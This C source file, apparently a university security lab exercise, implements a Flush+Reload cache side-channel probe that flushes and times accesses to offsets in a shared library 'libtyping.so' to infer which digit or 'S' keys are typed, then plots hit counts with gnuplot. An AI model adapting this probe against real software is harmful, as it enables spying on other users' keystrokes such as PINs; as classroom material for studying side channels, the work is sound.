#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include "cache.h"

char* base;
char* key0;
char* key1;
char* key2;
char* key3;
char* key4;
char* key5;
char* key6;
char* key7;
char* key8;
char* key9;
char* keyS;

uint64_t timings[11];
// A MODIFIER
#define key_0_offset 0
#define key_1_offset 1
#define key_2_offset 2
#define key_3_offset 3
#define key_4_offset 4
#define key_5_offset 5
#define key_6_offset 6
#define key_7_offset 7
#define key_8_offset 8
#define key_9_offset 9
#define key_S_offset 10
#define cpu_cycles_threshold

#define RUNS  								100000
#define LIMIT 								500

#define CACHE_HIT_UPPER_BOUND 150
#define DELAY_CYCLES          10000

int main(int argc, char **argv)
{	
	// Please change "library-path" with the true path of the library //
	base = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", 0x10000, 0);

	key0 = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_0_offset);
	key1 = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_1_offset);
	key2 = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_2_offset);
	key3 = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_3_offset);
	key4 = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_4_offset);
	key5 = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_5_offset);
	key6 = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_6_offset);
	key7 = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_7_offset);
	key8 = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_8_offset);
	key9 = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_9_offset);
	keyS = map_offset("/home/slamnia/3MIC/2s/secu/controle/valise/usb-key-src/libtyping.so", sizeof(char), key_S_offset);

	memset(timings, 0, 11*sizeof(uint64_t));
	
	/*
	uint32_t cache_hit_cycles[RUNS];
	uint32_t cache_miss_cycles[RUNS];
	uint32_t cache_hit_histogram[LIMIT];   
	uint32_t cache_miss_histogram[LIMIT];
	
	memset(cache_hit_histogram ,0,LIMIT*sizeof(uint32_t));
	memset(cache_miss_histogram,0,LIMIT*sizeof(uint32_t));
	
	// Write cache hit/miss cycles profiling below //
	int val = 0;
	uint32_t tmp;

	for(int i=0 ; i<RUNS ; i++) {
		//int val = 1;
		cache_hit_cycles[i] = memaccesstime(base);
	}

	for(int i=0 ; i<RUNS ; i++) {
		clflush(base);
		cache_miss_cycles[i] = memaccesstime(base);
	}

	for(int i=0 ; i<RUNS ; i++) {
		if (cache_hit_cycles[i]<=LIMIT) {
			cache_hit_histogram[cache_hit_cycles[i]] += 1;
		}
		if (cache_miss_cycles[i]<=LIMIT) {
			cache_miss_histogram[cache_miss_cycles[i]] += 1;
		}
	}
	
	// Plot using gnuplot (do not edit) //
	
	FILE *gnuplot;
	gnuplot = popen("gnuplot -persistent 2>/dev/null", "w");
	fprintf(gnuplot, "reset\n");
	fprintf(gnuplot, "$data <<EOD\n");
	for (int i = 0; i < LIMIT; i++) fprintf(gnuplot, "%d %d %d\n", i, cache_hit_histogram[i], cache_miss_histogram[i]);
	fprintf(gnuplot, "EOD\n");
	fprintf(gnuplot, "plot $data using 1:2 title 'cache hits' with lines, $data using 1:3 title 'cache misses' with lines\n");
	fflush(gnuplot); 
	*/


	/*for(int k=0 ; k<0x10000 ; k++) {
		clflush(&base[k]);
	}*/

	clflush(key0);
	clflush(key1);
	clflush(key2);
	clflush(key3);
	clflush(key4);
	clflush(key5);
	clflush(key6);
	clflush(key7);
	clflush(key8);
	clflush(key9);
	clflush(keyS);

	int cpt = 0;
	while(cpt<1000) {
		
		if (memaccesstime(key0) < CACHE_HIT_UPPER_BOUND) timings[0] += 1;
		if (memaccesstime(key1) < CACHE_HIT_UPPER_BOUND) timings[1] += 1;
		if (memaccesstime(key2) < CACHE_HIT_UPPER_BOUND) timings[2] += 1;
		if (memaccesstime(key3) < CACHE_HIT_UPPER_BOUND) timings[3] += 1;
		if (memaccesstime(key4) < CACHE_HIT_UPPER_BOUND) timings[4] += 1;
		if (memaccesstime(key5) < CACHE_HIT_UPPER_BOUND) timings[5] += 1;
		if (memaccesstime(key6) < CACHE_HIT_UPPER_BOUND) timings[6] += 1;
		if (memaccesstime(key7) < CACHE_HIT_UPPER_BOUND) timings[7] += 1;
		if (memaccesstime(key8) < CACHE_HIT_UPPER_BOUND) timings[8] += 1;
		if (memaccesstime(key9) < CACHE_HIT_UPPER_BOUND) timings[9] += 1;
		if (memaccesstime(keyS) < CACHE_HIT_UPPER_BOUND) timings[10] += 1;
		
		clflush(key0);
		clflush(key1);
		clflush(key2);
		clflush(key3);
		clflush(key4);
		clflush(key5);
		clflush(key6);
		clflush(key7);
		clflush(key8);
		clflush(key9);
		clflush(keyS);
		delay(DELAY_CYCLES);
		cpt += 1;
	}

	FILE *gnuplot;
	gnuplot = popen("gnuplot -persistent 2>/dev/null", "w");
	fprintf(gnuplot, "reset\n");
	fprintf(gnuplot, "$data <<EOD\n");
	for (int i = 0; i < 11; i++) fprintf(gnuplot, "%d %d\n", i, timings[i]);
	fprintf(gnuplot, "EOD\n");
	fprintf(gnuplot, "plot $data using 1:2 title 'access time' with lines\n");
	fflush(gnuplot);

	
	return 0;
}
